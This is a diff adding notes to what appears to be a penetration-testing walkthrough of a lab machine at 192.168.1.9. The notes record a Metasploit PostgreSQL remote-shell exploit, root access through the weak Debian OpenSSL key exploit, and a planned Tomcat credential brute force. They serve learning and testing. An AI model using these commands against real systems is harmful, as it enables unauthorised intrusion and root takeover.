@@ -175,6 +175,48 @@ bruteforcing the password using hydra but authentication not enabled on the serv
  
 searching the MSF i found a module for remote shell 
  
+ msf >> use exploit/linux/postgres/postgres_payload
+ 
+ set RHOST 192.168.1.9
+ 
+ run 
+ 
+ whoami >> postgres
+ 
+ now attend previllige esclation
+ 
+ cat /root/.ssh/authorized_keys
+ 
+ copy the rsa key
+ 
+ search exploit database for openssl 
+ 
+ download  the exploit 5622.tar.bz2
+
+https://www.exploit-db.com/exploits/5720
+  
+ tar -jxvf 5622.tar.bz2
+ 
+ grep -lr AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w *.pub
+ 
+ now we got our key 57c3115d77c56390332dc5c49978627a-5429.pub
+
+ attemp to connect as a root
+ 
+ ssh -i 57c3115d77c56390332dc5c49978627a-5429 root@192.168.1.9 
+ 
+ whoami >> root
+ 
+ 8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+-----
+ It an optimized version of the HTTP protocol to allow a standalone web server such as Apache to talk to Tomcat
+ 
+ seems not to be vulnarable 
+ 
+ 8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+---
+ search msf for vulnarabiltiy , found RCE that need to be authenticated so we will attemp a brute force searching for weak credentials
+ 
  
  
  
